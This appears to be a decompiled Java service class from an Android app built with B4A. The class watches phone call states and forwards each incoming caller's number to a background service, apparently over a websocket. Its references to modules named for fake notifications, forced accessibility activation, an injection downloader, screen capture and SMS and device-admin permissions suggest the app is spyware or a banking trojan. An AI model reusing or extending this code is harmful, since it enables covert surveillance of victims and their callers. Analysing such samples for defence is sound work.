package com.com.androidrr;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4a.phone.PhoneEvents;
import b4a.example.dateutils;
import java.lang.reflect.Method;

/* loaded from: classes.dex */
public class srvnewphonecall extends Service {
    public static long _callendtime = 0;
    public static long _callstarttime = 0;
    public static boolean _isincoming = false;
    public static String _laststate = "";
    public static PhoneEvents _pe = null;
    public static Phone.PhoneId _phid = null;
    public static String _savednumber = "";
    static srvnewphonecall mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _service_destroy() throws Exception {
        return "";
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class srvnewphonecall_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (srvnewphonecall) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) srvnewphonecall.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return srvnewphonecall.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.srvnewphonecall");
            processBA = BA;
            if (BA.isShellModeRuntimeCheck(BA)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA BA2 = processBA;
            BA2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.srvnewphonecall", BA2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (srvnewphonecall) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.srvnewphonecall.1
            @Override // java.lang.Runnable
            public void run() {
                srvnewphonecall.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.srvnewphonecall.2
                @Override // java.lang.Runnable
                public void run() {
                    srvnewphonecall.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (srvnewphonecall) Create **");
                    srvnewphonecall.processBA.raiseEvent(null, "service_create", new Object[0]);
                    srvnewphonecall.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 2;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (srvnewphonecall) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (srvnewphonecall) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (srvnewphonecall) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static String _pe_phonestatechanged(String str, String str2, IntentWrapper intentWrapper) throws Exception {
        Common.LogImpl("627787267", "PhoneStateChanged, State = " + str + ", IncomingNumber = " + str2, 0);
        if (str2.trim().length() > 0) {
            _send_data_to_ws(str, str2);
        }
        if (str.equals(_laststate)) {
            return "";
        }
        int switchObjectToInt = BA.switchObjectToInt(str, "RINGING", "OFFHOOK", "IDLE");
        if (switchObjectToInt == 0) {
            _isincoming = true;
            DateTime dateTime = Common.DateTime;
            _callstarttime = DateTime.getNow();
            _savednumber = str2;
        } else if (switchObjectToInt != 1) {
            if (switchObjectToInt == 2) {
                if (_laststate.equals("RINGING")) {
                    _callendtime = 0L;
                } else if (_isincoming) {
                    DateTime dateTime2 = Common.DateTime;
                    _callendtime = DateTime.getNow();
                } else {
                    DateTime dateTime3 = Common.DateTime;
                    _callendtime = DateTime.getNow();
                }
            }
        } else if (!_laststate.equals("RINGING")) {
            _isincoming = false;
            DateTime dateTime4 = Common.DateTime;
            _callstarttime = DateTime.getNow();
        }
        _laststate = str;
        return "";
    }

    public static String _process_globals() throws Exception {
        _pe = new PhoneEvents();
        _phid = new Phone.PhoneId();
        _callstarttime = 0L;
        _callendtime = 0L;
        _isincoming = false;
        _laststate = "IDLE";
        _savednumber = "";
        return "";
    }

    public static String _send_data_to_ws(String str, String str2) throws Exception {
        try {
            BA BA = processBA;
            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
            if (Common.IsPaused(BA, backgroundservice.getObject())) {
                return "";
            }
            BA BA2 = processBA;
            backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
            Common.CallSubNew3(BA2, backgroundservice.getObject(), "Send_Phone_IsCalling", str, str2);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("627852807", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _service_create() throws Exception {
        _laststate = "IDLE";
        _pe.InitializeWithPhoneState(processBA, "PE", _phid);
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StopAutomaticForeground();
        return "";
    }
}
